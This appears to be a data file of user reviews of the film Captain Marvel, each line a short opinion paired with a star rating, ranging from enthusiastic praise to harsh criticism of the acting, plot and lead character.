"It's Marvel Jim, but not as well know it! A bit meh but OK if you've got it in in the background. Carol doesn't work like wonder woman for example and just falls a bit flat.",2
"I honestly thought this movie was truly bad. Brie Larsen‚Äôs acting was flat and the story was rushed. I was not a fan of the new Disney ‚Äúwoke‚Äù way of creating movies, putting politics ahead of good story telling.

"how can people NOT like this movie It's blooming fantastic? The cast, the action was just pure gold and the humour of it was amazing. I loved the movie. The action sequences though was LOVE.",5
"I really wanted to like this film. In discussions of the trailers, I was making excuses for Larson's character being such a plank, as it seemed to fit the character of a test pilot, but then we saw it, and boy howdy... you really can't have two hours of the main character being utterly expressionless and responding inappropriately to other characters, unless the subject is autism, which I presume this was not. I don't know if this was Larson's interpretation of the character or some really inept direction, but her character was totally unlikable and unrelatable to a degree I've never seen in a Marvel movie. Even Thanos, the monster bad guy, had moments where you could relate to him. Captain Marvel was an action figure stuck in a live action film. Just... there.",1.5
Good fun movie with a slightly weak villain. However this movie is definitely over-hated.,4
"Definitely as good as any other Marvel movie. (Even the critics agree!) Brie Larson was awesome as Captain Marvel. With this audience rating, basically what you have is a bunch of whiny bros, perhaps from Saturn's moon Inceladus, who think Brie is mean so they felt the need to bomb the ratings. Can't wait to see her again in The Marvels (2023)!",5
Awesome film fun fantasy adventure,5
Surprise me with her power!!!,5
The first 20 minutes are a little clunky but this was seriously fun. Loved the 90's soundtrack and my god Brie Larson is great. People are missing the point that her un emotional acting is story based and not on her skills (She's an Oscar winner y'all). Can't wait to see more of Carol Danvers in the future.,4.5
Not nearly as bad as everyone pretends it is,4.5
"You know something is off when you finished watching the movie and can barely remember the story already and all I can say about Captain Marvel is that she's strong but nothing about her as a person or a character. Because that's what Marvel gave us ‚Ä¶ nothing. She doesn't have a strong connection with anyone ‚Ä¶ she is simply there. I wouldn't say there wasn't any betrayal, etc ‚Ä¶ but you simply don't see anything beyond Carol beating them up ‚Ä¶ I mean you don't feel she felt anything ‚Ä¶. I mean say contrast it to another Marvel scene ‚Ä¶ Loki yelling at Odin ""Tell me!"" Tony telling cap ""I thought I was your friend"" It doesn't require more screen time but the audience felt that. Maybe the it's the director, maybe it's the lead actor but the movie despite its great effects and fight scene was just dry and unmemorable. It's still entertaining, something to watch when it's there. But when all most folks na remember from a movie is how a supporting character lost an eye and nothing about the the lead of whose origin story is being told ‚Ä¶ it's not much of an origin story.",2.5
The movie was just overrated no story no thrill Only kids will have enjoyed this,0.5
Thinly written but well acted. Brie Larson and Samuel Jackson are fun together in spite of a predictable and under-developed origin story.,2
"This movie was poorly written, poorly acted, drivel that was shoved down the throats of audiences. They literally released it at a time when people were more interested in infinity war Easter eggs and the movies post credit scenes. One awesome bit is where they reinvent where the avengers team name is from to give more significance to the character, but doing nothing to further the plot. Throughout the film there is never a thing that actually challenges her and the villain is Jude Law and a computer? Really?",0.5
It was visually really impressive they made a man hating plank of wood a superhero,1.5
No sensible plot. The CGI was subpar. The protagonist has no visible weakness and is more a Mary Sue. Marvel's clearly run out of ideas.,0.5
"A movie and character that could have been left out of the MCU and no one would have noticed. It didn't advance the storyline and had overt intersectional ideology beating you over the head that actually had the main character acting in horrible ways because of feminist empowerment? It had potential, but it turned out bad.",1.5
"I saw it, but I don't remember it at all. Worst Marvel movie ever.",0.5
"MCU makes good movies but honestly what is this- I cant relate or feel for this character at all. The storytelling is slightly sloppy, and why did they sacrifice a huge part of nick fury's identity for a lame joke? She's too emotional? when was she ever emotional? She's funny and smart? Name one scene where she's funny and smart.",1
Not Faithful to the comics and was boring but Samuel Jackson was great in it.,1.5
"The worst MCU film that I consider to be nearly unwatchable. It has some redeeming things about it, like Samuel Jackson's performance. But overall, really hard to watch. 2/10",1
"it didnt respect much the original comic books, plus lame acting and weak history and development.",1.5
Awful. Why do I make myself watch these?,0.5
"Brie Larson is a f*ing goddess in this movie. A perfect, god-like-strong hero goddess. Anyway yeah, I yawned through most of this flick.",2
"A hot mess from start to finish. I couldn't comprehend the so called ""plot,"" so I tried to watch again. Five minutes in I had to shut it off to avoid nausea.",1
"One of the worst movies I ever seen, so boring & no plot at all, Brie Larson acting cool like a emotionaless robot makes the character even more dislikable than it already is, villians & CGI are also very bad.",1
"Between no flaws, no personalities, no emotional responses to anything, and vague powers that are so strong nothing can even challenge the hero this movie is a snoozefest. It also creates and then doesn't answer a few questions about the larger MCU universe but does answer (poorly) questions we never asked like how Nick Fury lost his eye, or where the name for the avengers initiative came from. I can not stress enough that they answer these questions really poorly while bad writing creates new questions they just are never going to answer.",0.5
"Mais do mesmo, a personagem principal √© a pior do filme, se n√£o fosse pelo Samuel L. Jackson eu daria uma nota pior.",3.5
"Totally full of fails, plotholes, and Brie Larson is son Hateful and nothing memorable",0.5
"The film is okay. The big issues like slow pace, weak characterization and some bad action scenes. But I think its better than people give it credit for with good CGI, great performances and some good humor.",3
"Marvels writing flat, one dimensional characters who never need to overcome anything has ruined the MCU. The trend started with this movie and with the notable exception of Endgame, has completely turned me from a fan to a former fan of Marvel",1.5
It's the worst movie it's a shame for a superhero movies can't believe what people are nowadays that it made more than a billion dollars,0.5
It had some reasonable bones but just tired of the messages over entertainment.,2
"The problem with this movie is that it is not entertaining. The storyline looks good, on paper. But the director (whoever that is) seems so terrified of anyone being bored even for a second, that there is no time for character development. The main character lacks screen presence. It is almost cruel, it looks a bit like when the cast of Friends tried to be movie actors. Strange. Brie Larson looks the part, but she does not act it. Hard to see why they cast her for this role.",1
"While this film deserves 3.5 stars, I'm going to give it a 5 to balance out all the trolls who review bombed this film. It's a worthy addition to the MCU and introduces a fantastic character who I hope to see for years to come.",5
Finally seen the movie and I have not much to say,0.5
MISS Marvel is just a one note character. There is no joy in playing the character. Nothing brie does makes me like the character. I kept reading comparison to Robert Downey Jr. But she bring nothing to the role. RdJ brought. Ironman to life.,0.5
"This movie was phenomenal, I‚Äôve never seen Marvel fail a movie. This movie had great acting, great effects, and had a great story and once the movie starts, your already hooked. That‚Äôs what I love about this movie. It‚Äôs interesting right off the bat, and it‚Äôs also not a confusing movie. I would definitely recommend watching this because you will not be disappointed.",5
"My favorite MCU movie! Brie Larson is outstanding as Carol Danvers, AKA Captain Marvel the most powerful Avenger in the MCU!",5
What a missed opportunity.,1
"While far from the best that the MCU has to offer, it's a satisfying adventure with some laughs and interesting new additions to the universe. Brie Larson does a good job considering the character.",3.5
"Not worth a theater ticket. Sacrifices genuine alienness for snappy dialogue and contemporary come-backs. Good cast, good production values -- lame writing. Was a lot like Female heroes in Male drag or a 60s Bewitched for the 2000s -- just wish to make it so.",2.5
"I enjoy watching films in the Marvel Cinematic Universe. This one was okay. I found myself disoriented and a little overwhelmed with the unfamiliarity of the alien setup up and the apparent contradictions of certain things with other MCU stories. Those things were sorted out over the course of the film, but I found the disorientation unpleasant. While I appreciate that Audio Description was provided (particularly valuable in action films) I was disappointed that they encoded on a Dolby 2.0 track rather than a 5.1 track. I've come to appreciate the surround sound and feel cheated when it is not there.",3.5
"The first female lead film in the MCU is a decent effort. Brie Larson wonderfully plays the emotionally withdrawn and sarcastic Carol Danvers. There are some slight pacing issues and the original score isn't the best, but overall its a sound film. I was really offended by the onslaught of fan hate for this film, as every criticism had to do with the feminist tone, the dry and sarcastic lead (hello, Iron Man) and the overuse of CGI (hello, every superhero movie made). My one hope is that if a sequel is made I want to see Monica Rambeau, the 2nd Captain Marvel in the comics, also gain her powers and become Danver's protege.",4

"Best movie of all time, enjoyed it from beginning to end. Don‚Äôt let the salty haters fool you, they just mad they got their feelings hurt. This movie is instant classic.",5
I just hate how perfect captain marvel is and how big of an ass hole she is,1
"Look, it may be a little flat and a Phase 1 movie later seems kind of repetitive, but it's still good fun.",3.5
"The movie was fine, until... [SPOILER WARNING] Captain Marvel unlocked her full powers & just steamroll through all of the enemies without breaking a sweat. This ruins what should have been the climax of the movie because the bad guys are literally no threat to her at all. But everything prior to that point is fine.",4
This movie gets way too much hate for no reason r√≠e Larson killed it as Captain Marvel and she was phenomenal I give this film a 7 out of 10,3
A very formulatic movie with a weak plot and bad villians creating an unsatisfactory movie. I like the character of captian marvel although this plot did not do justice to her and left her very undeveloped. The plot was very weak following the MCU formula yet again but to less positive results The villians were just plain bad no real goals or intentions. Nick fury was more of a laughing stock in this movie which is not very fitting to his character making him unlikeable. The visuals were good but everything else was bad leaving a headache of a movie I wish they could of done better but sadly this is just a bad movie.,2.5
"While Marvel usually has a main character that has some development, such as Tony Stark, none exist for Captain Marvel. Played by an actress with the emotional range of a block of wood you won't find any enjoyment here other than the fact its part of the MCU.",2
"I just didn't enjoy the movie, The main character was just not fun to watch. 6/10",3
"Captain Marvel is really worth a watch, very entertaining and visually impressive",5
"Half of it is the cookie cutter mass produced Marvel movie. The other half is boring, the villain is weak, like no abilities what so ever to make him qualify as a villain. I would best describe it as the people involve spent most of the time going through a political checklist and then fed it into the Marvel money machine.",1.5
"The film is fine in general except for the pacing that is sometimes off. However, Captain Marvel's strength does not make you watch in awe but instead makes most threats meaningless and the film having no impact on the audience at all.",3.5
"Even though this is one of the weaker films in the MCU in my opinion, some of it is highly enjoyable.",2
Not the worst of the recent MCU movies which is the only reason I'd give it more than 1 star.,1.5
"#15/25 Best Moment: Friendship with Nick, the alien people",3
"It's not perfect, but it's pretty enjoyable. Brie Larson's pretty entertaining, but I feel like she was holding herself back. Her chemistry with Samuel L. Jackson and the girls playing the Rambeaus is pretty good, but I think she struggles to play off Jude Law.",3.5
"This film is SO COOL and so relevant and... They're hinting at a lesbian Avenger and I seriously hope it goes that way. I love how Carol is strong and powerful, probably the strongest Avenger in the MCU, and she's still not perfect. There are many scenes in this film that are so important, I wish I had grown up with these messages as a girl. We also got a long-overdue introduction to the Kree and a lot of easter eggs regarding Fury were explained, but it's a little hard to swallow that Carol hadn't been summoned in previous Avenger-level situations before. It's a very good film. Oh, and the soundtrack is a masterpiece.",5
"The movie is 4 stars for me but i vote 4,5 cuz is so UNDERRATED",4.5
"i love this movie, it made me Carol be my favorite heroine.",5
"Not worth your time, Ideology driven versus strong story telling, very bland acting. Sam Jackson was good, but the lead actress was bland, no acting skills at all.",0.5
"Wooden acting. Shoddy plot. Overpowered ""hero"". The half star is purely for Samuel L Jackson. Motherf...",0.5
"It more or less tried to cram 40 years of character development into a tiny movie and it left a jarring and disorienting film. Realistically this should have been a trilogy, not a rush job. With time it could have been a thing of beauty. Now it was a hollow shell of her comic book origins.",1
What is this? What happened to the film industry in the last couple of years? Only positive thing: this movie would have inspired little girls all over the world to become mediocre actresses playing badass Mary Sues kicking ass and taking names when they grow up. Unfortunately they didn't watch it.,0.5
"I thought that this film was quite good. A really interesting and engaging story, Captain Marvel is a great character and a welcome addition to the franchise. It had great visuals and action.",3.5
"Overestimated character, bad acting, distortions made to please ideology.",0.5
I‚Äôm mostly mad that this film ruined Nick Fury‚Äôs character. In Winter Soldier he says he was double crossed. This movie made a joke out of it and I‚Äôll never forgive them,0.5
"While I will always take more Phil Coulson and Nick Fury, the first female-led solo film in the MCU was a lot of flash but little substance.",2
Nothing at all like the comics. Why bother taking these characters and completely changing them.,1
"Extremely sub-par. Often awkward, forced and embarrassing to watch. There is absolutely no chemistry between Brie Larson and Samuel L. Jackson, it's just painful at times to watch. One of the absolute bottom tier Marvel movies.",2
The movie was boring. The lead was unlikable.,1
"Bad writing, worse acting from the lead. Samuel L Jackson being reduced to an ethnic sidekick was painful to watch. It held zero revelations about Infinity War and piggybacked upon the success of a much better pair of movies purely because of a deceptive marketing campaign.",0.5
Unrelatable and Unlikeable. The back story on Nick Fury broke the character.,0.5
"Disappointing yet satisfying, this film pushes you through a fun story that has smart ideas and great connections but very predictable plotlines and boring sequences that rappel you from the story. Overall the mystery, visuals and action keep you hooked to a decent marvel film with great connections to the MCU",3
"They seem to have entirely forgoten how to write human real struggles into characters and stories, so they now default to the demode script of conceited women as heroine. To make it worst is boring, and the lead character has some bad idea of what acting and performance should be.",0.5
"A very mixed bag with a bunch of missed opportunities, but it's far from bad.",2.5
"Not a very good movie. Carol Danvers has never been a popular or well liked character, so the problems with this movie begin with it's actual conception. Add in a backwards story, some flat acting and useless ""girl power"" sequences, and the movie shoots itself in the foot. The bright point of this movie is the character of Nick Fury, who is much more charismatic in his younger years.",1.5
"Preachy. I don't watch a superhero movie to be preached about something. Actions scenes were good, but the protagonist was full of spite and honestly quite bad. ""Show, don't tell"" is a good rule to follow, and in depicting this heroine as the be all end all they failed big. Without the preachiness it could have been a better movie.",2.5
This was a fun movie. Not the best MCU movie but certainly not the worst.,5
"Terrible writing and to call the acting ""wooden"" is an insult to trees.",0.5
"Not Marvel's best, but overall a great film. The Audience Score, with more than twice the amount of reviews than any other of the 23 MCU films to date, is the result of a boycott against Brie Larson.",4.5
"Behold, the future of film-making. Everything will always be terrible forevermore.",0.5
"Maybe I was coming in too hyped for this movie, but it was the first Marvel movie let down. It wasn't the last.",1.5
"Horrible writing and acting. If you're making an action movie, get a lead that can do action. The fight choreography wasn't great and looked like the main star had never thrown a punch before",0.5
pointless pandering to a non existing demographic.,0.5
Terrible movie! One of the worst superhero movies of all time. Brie Larson is awful.,0.5
"Very decent, underrated. Not too much wrong with the script, fury is good, just a little forgettable.",3.5
Pretty bland for a Marvel film,2
"Brilliant movie, although it was a bit spoiled by the trailers. The biggest problem with this movie is that it came out right before Endgame, implying she was going to have a larger role, a problem that no longer is a problem in this day and age. Otherwise, a great movie with some great surprisingly familiar faces.",4
I really enjoyed itüß°,5
At times captain marvel feels like another one of those live action Disney movies because of the ridiculous story,2.5
"I still feel lucky to see a bad, box office super hero movie, so I can't complain about an average super hero movie. So I feel no apprehension adding a point for subject matter. It just is what it is, if you like marvel movies, it's fine, if you don't care about marvel movies, I understand not wanting to watch it.",3
"I enjoyed the movie very much. It felt like a usual Marvel movie, but it also has a different feel to it. The movie showcases the journey Carol Danvers goes through to discover her past and find out who she really is. Many people disliked Brie Larson's acting, but I found no fault in it. She has tried her best with the script provided to her. I would not blame misogyny for its poor audience rating, but I think people are giving it a lot of unwanted flak. I personally found it quite interesting. I'd recommend it...",3.5
"Disappointing in terms of acting, the costumes and storyline was decent. Easily understandable plot and looks like Captain Marvel was before all the movies but im confused with Captain America. He was before but probably around but they havent discover him yet. Since Fury was only starting to create the SHIELD after Mar Vell the scientist.",2
"Wow what an amazing movie, brie fited so perfectly in this character, i loved it sooo much!",5
This was just painful to watch. Because I can is just not a plot.,0.5
"Thought it was a great film! Acting was excellent, good writing, & great music/sound design.",5
Captain Marvel fails to deliver an engaging origin story due to lack of any kind of charisma from its titular character and antagonists - the only strong point being to showcase Nick Fury's past.,1.5
"Not an absolutely terrible movie but also not close to being a good movie. The skrulls made the movie watchable. No offense to Brie Larson, I like her portrayal of captain marvel, but not really an enjoyable movie. Although there was some Nice humor.",0.5
Thoroughly enjoyed. Larson is a badass.,5
"Pel√≠cula m√°s mala y soporifera, ¬øA qu√© cr√≠ticos les gust√≥?",0.5
Larson is the worst part of the movie.,0.5
"Poorly developed characters, thin plot, average special effects. I feel like Marvel are taking my support for granted.",1.5
It's hard to like a movie when you don't like the main character,0.5
this movie is disappointing and doesn't live up to the other marvel movies,0.5
"It had potential, but unfortunately the goal of this movie was to empower women not entertain, so it comes off as annoying, empty and pointless...",1.5
This was partially a Nick Fury prequel. What is there not to like?,5
Did not enjoy this movie. Brie Larson is just a terrible actress.,0.5
Don't waste your time with this horrible movie. Worst marvel movie ever,0.5
"Unlikable invincible protagonist, forgettable villain, no tension, boring action scenes and a little too preachy and on the nose with its message.",1.5
Predictable plot and a shallow hero with no meaningful character or development.,0.5
"Worst failure in the history of the modern MCU. Totally unrelated to source material, terrible acting, more interested in scoring political points than story-telling, I could spend hours talking about why this movie was terrible.",0.5
Pretty boring. Can't really get attached to the characters in this one. I was told the cat was the best part of the film... Meh.. maybe if it were a dog...,2
"Disclaimer: I'm new to Marvel, watching everything in chronological order. So perhaps that's why this movie doesn't do much for me. It served a purpose of introducing a lot of important Marvel backstory with Nick Fury, SHIELD, Monica Rambeau, and the tesseract. It's not a bad movie, just doesn't have many (if any) rewatchable features. I felt confused most the entire time, and still finished somewhat confused - this is my first introduction to Kree and Skrull, and I'm still not convinced the goal of each and who is really the good/bay guy. Maybe this movie will mean more once I know more about the Marvel universe; otherwise, it doesn't survive as a stand-alone film.",2.5
"Definitely not the best Marvel movie, some scenes are just impossible to follow and the story still leaves you asking questions. I do like some of the characters in this movie though, but sometimes Carol Danvers can be extremely boring to watch over two and a half hours.",2.5
Overrated super heroine .,0.5
"It doesn't get much worse than this dumpster fire. Another big budget cgi monstrosity with no plot, horrible acting and writing, cartoonish action sequences and an unintentionally hilarious star. When will the studio drones realize cgi does not make a story? These infantile comic book movies need to stop. Its over",0.5
Good movie 7/10 but I did not like the villian.,3.5
"Ugh... Terrible script, terrible acting, no character development... :(",0.5
worst movies so far from Marvel studios,0.5
"I loved this movie, i watch it often. I don't find it rush or anything. I found it interesting throughout the whole movie.",5
Probably one of the two worst movies so far from Marvel studios. Brie Larson is unlikeable and the story is pretty naff. Seems like it was just shoehorned in before endgame.,2
This is one of my favourite movies just because this is one of the only movies I keep rewatching because of the boost of energy it gives me and it makes me feel like I'm on top of the world and nobody can stop me.,5
This movie is really great! There is an interesting twist villain who still gets time to be evil. Definitely watch this movie. I personally don't hate Brie Larson and I like the Captain Marvel character and it doesn't make a difference being female rather than male.,4
"Anyone who knows me knows that I despise this movie. I really, really, really, really, don't like Captain Marvel. But I do like Captain Marvel as a comic book character. Typically as a villain. Civil War II is a flawed comic. It doesn't have the same political issue that made you think because both sides of the argument could've been right. But Civil War II made Captain Marvel a villain. Did it do justice to her character? I'm not sure, I don't read Captain Marvel. Did make her interesting to me? Oh yea. I love villains, and seeing Captain Marvel as one is really cool. She was a tyrannical person who didn't care about anybody else's thoughts because she thought she was right. (Kinda sums up Brie Larson's personality). Was she right? No, not even close. Now why am I rambling on about Civil War II? Because that's the most interesting Captain Marvel to me. Contrasted to this one, which I despise. The main character doesn't carry the movie, if anyone does it's the side-characters: Nick Fury (Samuel L. Jackson), Talos (Ben Mendolsohn), and Maria Rambeau (Lashana Lynch). I watched this movie because they were interesting to me. Brie Larson took the most boring approach to playing the character in this film. I was bored watching this movie. And Brie Larson can do some pretty good acting, but her as Captain Marvel just did not jive with my funky fly soul (that was an attempt at comedy). And the writing. It is not good. It's not like Mortal Kombat: Annihilation terrible, but it's not good. It's basically The Bourne Identity, but without the stakes, without the emotion, and without the substance. It just copies the tried amnesia trope over and over. It doesn't really seem to fit. The cinematography isn't really that great. The best shot in this movie isn't really that good. And all these criticisms break my heart. Because there are little girls out there who love Captain Marvel, and see her as a role model, and then when her movie releases, Captain Marvel's new nickname is ""Space Karen."" And it seems as if the writers purposely tried to make Captain Marvel entitled as possible. There are no stakes because she's so powerful. She has no emotional problems. She just cruises right through the movie. So I didn't like this film. It saddened me. Good night. Sleep tight. Don't let Edward Cullen bite.",1.5
A sub par plot with bland characters. Even Jude Law and Annette Benning seem to be bored by their characters and at least these two have demonstrated they can have charisma.,1.5
Don‚Äôt know where to start the movie dragged and could have been better,2.5
"Captain Marvel was okay. The movie has a very good start, but similar to Thor the movie falls off when Carol Danvers gets to earth. The story itself isn't that great and most of the time really boring. What I like though is the chemistry between Brie Larson and Samuel L. Jackson. All in all I give this movie a 2,5/5 stars.",2.5
"My main gripe is that the protagonist is uninteresting, a know-it-all, and has little to no character arc. While this is not the worst movie ever made, it is certainly the worst of the MCU. Don't bother.",0.5
Note to writers: audiences tend to enjoy identifiable characters who are developed through the script and interesting plots. This isn't it.,0.5
"It just felt sort of generic and seemed to conclude nothing. All it did was introduce Captain Marvel and the skrulls for other projects. Also Captain Marvel could have been may better cast, as I don't care to see her in the future MCU that much. Rating C+",3
"Samuel L. Jackson is great in this movie, but all the rest is nothing more than OK.",3.5
It's perfect. Brie Larson did amazing in it. You have to watch it.,5
"This was a disappointment. The Skrull plot was a good idea, but the rest of the story was just bad and uninspited. For example who came up with the story on how Fury lost his eye?! The main character is a total Mary Sue with no real development.",1.5
"The best part of the movie was learning how Nick Fury loses an eye, the visuals were good but action sequences were forgettable, as was the plot, this is an origin story without substance or character development, Captain Marvels training is done off screen so we don't have an opportunity to see how her abilities first manifest or how she copes, it's a slap dash mad rush to the end and you'll not be given the time or incentive to get emotionally involved.",2
"I just didn't like this very much. Captain Marvel's character wasn't very relatable, almost seemed like a villain at certain points, and it was mostly forgettable. I don't really care too much for Brie Larson, though The Room was really good imo, but I was willing to give it a chance. Def won't be seeing the sequel.",0.5
I really wanted to like Marvel as she is one of my favourite comic book characters but I felt preached to.,0.5
"Boring and predictable, Irrelevant for MCU",0.5
I loved Bree Larson! Captain Marvel is a great addition to the Marvel universe. The movie had just the right amount of girl power messages and I loved the references to older action movies.,5
"I think is fenomenal because the hero born from dificulties, and not worrie about gender",5
"It is an amazing movie! Just amazing and empowering, the man just have to back off and don¬¥t be so intimidated by females.",5
"This movie had a lot of fun elements. Samuel L. Jackson was on point as usual but, I'm unsure about our protagonist. Brie Larson has the chops to headline any major franchise but, I can't tell if it was the script issue or how the characterization was done by the actor that made me kind of dislike the lead. It felt like there was no real relatability or development in her character. It's extremely hard to get emotionally attached to someone that is overpowered. The struggle of the character can help add nuance and development. I hope in the sequel that they give her more depth.",3
ugh...overpowered and over acted. painful at times to say the least,0.5
"Follows the typical Marvel formula, which had be disappointing so deep into phase three, but it still makes for a fun movie. The format can be slightly disoriented on a first view, but only gets better the more you watch it. The de-aging of Samuel L. Jackson's Nick Fury is seamless and the transition of the skulls from antagonists to protagonists is unexpected. Both Brie Larson and Carol Danvers get unnecessary hate for an actress and character that are both great in this film. The movie has its issues, but its still a fun movie in any MCU marathon.",3
Hated itin every way possible. Especially bree Larson,1
"Loved it, I was surprised I actually enjoyed it. I'm not usually into female leads, but she did very well.",4
"If you want to watch a badass female action heroine who is a good role model for young girls, go watch Alita: Battle Angel. In Captain Marvel, rather than the best qualities of strong women, the protagonist epitomizes the worst qualities of insecure men.",0.5
had some actual funny moments this movie was decent,3.5
Its Bad realy BAD. Way to much Oneliners.,0.5
Worst in the mcu. Brie Larson is extremely unlikable in this role.,1.5
"This movie falls short in several areas. Brie Larson gives a wooden performance and has almost zero personality. Nick Fury, the mastermind of the Avengers and brilliant tactician, is left following her around apparently at a loss for what to do unless Carol tells him and then has his eye taken out by a cat. Then when Carol unleashes her full strength she becomes this unstoppable force and wipes everyone out. No chemistry, no consequences, and almost nothing to advance the MCU. Don't waste your time",0.5
With it's funny moments and awesome actions scenes this is not a bad movie and also I love overpowered characters so seeing captain marvel as one is awesome,3.5
First MCU Movie i genuinely disliked to my heart,0.5
Why is this movie hated? Its fucking fantastic.,4
Had to watch this when there's nothing else to watch. If only it wasn't part of Marvel Story line. the 1st marvel movie that I hate it,0.5
I wasted my Half an hour than I decided to not to waste more time on this third class movie... nonsense acting and storyline.,0.5
Terrible film even Shazam better then this,1
Definitely the worst movie of the Marvel universe. No character arc. The typical vague story. Brie Larsen is probably the most unlikable actress to play a super hero. It definitely doesn't help that the Captain Marvel is a horrible character in this movie. In the comics = somewhat ok. Thanks for robbing me of my time.,0.5
"Why, oh why haven't I checked viewers' opinions on RottenTomatoes first...? Embarassing, a complete disappointment. Not in line with the franchise storyline at all, just another try to squeeze out some cash out of the faithful fans. Could not exist at all.",0.5
The main character or hero is totally unlikeable. I found her acting and the script to be grating.,1.5
"We are used to classical Marvel Films with ups and downs but still amazing movies. Captain Marvel on the other hand really disappointed. Every Marvel hero has flaws and they were not shy to show them, just look at STony, Romanov, and Banner for example. Carol Danvers on the other hand is the embodiment of perfection and is represented as such. For me, it's just another attempt at getting a strong lead character by brute force. Please Look at Rouge One, Star wars The Clone Wars and even the Ironman trilogy and Black Pather. there is no need to force anything.",1
"Captain marvel is a lifeless, overpowered Mary Sue who we are told throughout the movie is a good, funny, smart person but this is not shown at any point in the movie. She is told constantly that she is out of control of her emotions, but she shows less emotional range than Bella Swan in the first twilight film. The whole movie is a petty ""men bad, women good"" without any real soul. By the end you have no real investment in her character, and her presence in endgame spat in the face of all the characterisation and heart given to every other character. If you want to write a strong female character, look to black widow and take notes.",0.5
"WORST MARVEL MOVIE EVER CREATED. NOTHING MEMORABLE, NOTHING EPIC, AND MORE OF THOSE STUPID JOKES MAKE THIS MOVIE THE WORST SUPERHEROES MOVIE.",0.5
"The biggest set back of this movie all revolves around Brie Larson and the character of Captain Marvel. Brie Larson's acting in this movie is sub-par. She shows almost ability to accurately display different emotions depending on the situation. Her performance was very much lack luster to me. For the character of Captain Marvel. There is no way to connect with the character. Instead of seeing and feeling her faults, we are told them. Not to mention she has ZERO weaknesses. The climax fight of the movie didn't feel like a climax. I knew she was going to win and nothing could be done to stop her. For a superhero movie to be successful, there has to be doubt and fear that the hero will prevail (although we know they will win because it is a superhero movie). All hero's have some weakness, i.e. Superman - kryptonite, Ironman/Batman - Mortal. Even Thor who is a god can be injured and killed.",1
"Great action that is nicely adapted to the many different environments in this film. Brie Larson has a strong leading presence and great chemistry with Samuel L. Jackson's Nick Fury. The movie tells a great self contained story about self discovery and friendship wile also revealing the larger cosmic world of the MCU giving us context to events that happened throughout the franchise making this a must watch for any Marvel fan, Excelsior!",3.5
"My FAVORITE superhero!! I love this character, storyline and all things Captain Marvel. I need to see more of her in future Avenger movies. Girl power all the way.",5
"Whatever Captain Marvel does in the movie is not heroic, she is arrogant and reckless. Also the whole movie is focused on virtue signaling. The whole movie is based on Captain Marvel trying to prove that she is better than the men around her, other than that she has no personality.",1
"A fine movie, the story is decent and there are some nice side characters. Still, the film lacks proper tension and the fact that Captain Marvel doesn't face real opposition hurts the movie as well as the greater universe, as it very much makes her a Deus ex Machina in the broader context of the MCU.",3.5
"The passionless directing and flimsy editing really hold this movie back. There are strong moments and story beats that keep it from completely sinking, but it's one of Marvel's most underwhelming efforts to date. FULL REVIEW: https://letterboxd.com/blujayfilms/film/captain-marvel/",2.5
"Some movies are just completely forgettable. Like Thor 2 forgettable. This one compounds this with just some really bad story telling. Captain Marvel gets no arc in the story.... nothing can touch her, nothing is at risk for her so she ends up being boring. It does not help that Brie Larson plays her so flat, making her even less compelling and less likely to be remembered. The cat in this movie has a bigger arc than the main character. Perhaps the lead could have been portrayed better through improved direction or a better script - but clearly one of the glaring shortcomings of this flick is the script. Aside from abandoning the core tenants of what makes for a good story, there is plenty here that just plain makes no sense. If you are not paying for it and you just need some background sounds while you are focused on working, you will likely get more out of this film than if you actually paid attention to it.",1
"This movie is just propaganda, the story is full of holes and the protagonist, my god, this protagonist don't have any personality whatsoever and it don't improve after the ""challenges"" that this mc go through during the movie. The movie can be summarized into: ""op mc punches and lasers things""",0.5
"I love Marvel movies, Ive seen them all. This one was the rare exception. Wish I could get my money and time back. Horribly miscast lead.",0.5
"This was just a bad movie. No, not because it was 'woke trash' like many have said about it, but because it simply falls flat on having a strong main character- and that I place the blame solely on the casting of Captain Marvel/Brie Larson and Disney's behind the scenes producer/director choices. There are so many better choices for a female lead, and it's a crying shame that this was the first Marvel MCU movie to feature a female lead and not Black Widow/Scarlett Johansson. Those that criticize the Marvel fans that have enjoyed all or most previous films in the MCU but disliked this were placing the blame solely on those being sexist or simply not supporting female leads. My argument to that is that we simply don't like Larson for the role- the character is fine, though flawed in terms of writing (while a Superman type character that is overpowered and needs a kryptonite or excuse to be absent in order to bring some believability or situational danger to keep things interesting when they can merely super punch or fly through a villain rather than struggle). Larson's acting is very flat and stiff in this film. Both my wife and I were uninterested in her character's journey, as we felt no connection or empathy towards her due to the actor's inability to convey a wide array of emotions. It had nothing to do with her being one of the most powerful superheroes introduced thus far! We felt the same upon her return in the Avengers movies that wrapped up the Infinity Stones story line. She was just 'there' for lack of a better term to describe her presence. It was cool to see her (spoilers) take out Thanos' ship at the end- that may have been the only time that I was somewhat interested in her actions in the movie, and how she stood up to Thanos when he had all the stones in the gauntlet, but at the same time, several other characters were able to stand up to Thanos who were mortal (Captain America) and inflict damage to him (Scarlett Witch) at other parts so it wasn't exceptional. We have no interest in seeing a sequel with her in it. The Captain Marvel movie, to me, was good only because of the 90's setting, soundtrack and nostalgia references along with de-aged Coulson and Fury. Other than that, I was rather bored watching this one. Wonder Woman was a much better female lead superhero flick!",1
"Captain Marvel does seem like a rushed film in terms of character growth and development compared to other MCU films, but the same lovable quality and charm is still present throughout the film. It is refreshing to see another side to Nick Fury that we have yet to see in other movies. The friendship between these two characters is fantastic and the chemistry is delightful. Captain Marvel overall is a delightful addition to the MCU and I am excited for future appearances from Brie Larson.",3.5
just as boring and bland as any other marvel movie.,2.5
Boring and not creative,2
Was just straight up boring.,0.5
"For a character who is supposed to be the strongest, Captain Marvel is the least inspiring and has the weakest character and story arc.",0.5
Not fun at all... the character is invincible and arrogant as f*** there is no learning or fun at the story/drama,0.5
just a bad movie i did not like the plot the acting i was bored most of the movie. I cant say what cuit was off,0.5
A very underrated marvel movie that everyone needs to see,5
A very good movie in presentation and visual effects but a terrible message even breaking with basic narration rules - like so many movies these days. I won't mention on visuals because they are great. This is no surprise as CM is not the first marvel movie so you can expect this. What worries me is the character arc. It's said Carol Danvers has a weakness she needs to overcome. Fair enough. But the revelation is she never really had this weakness. She was OP all along and acknowledging this costs her literally nothing. A man is responsible for her weakness and she needs to liberate from that. So the basic message is self-empowerment. This paints a very bad picture because there either is no overall message for people watching or the message is to liberate yourself from oppression holding you donw. Sounds familiar? It's as awful as it sounds.,1
This movie is overhated. It was pretty good especially Nick Fury.,4
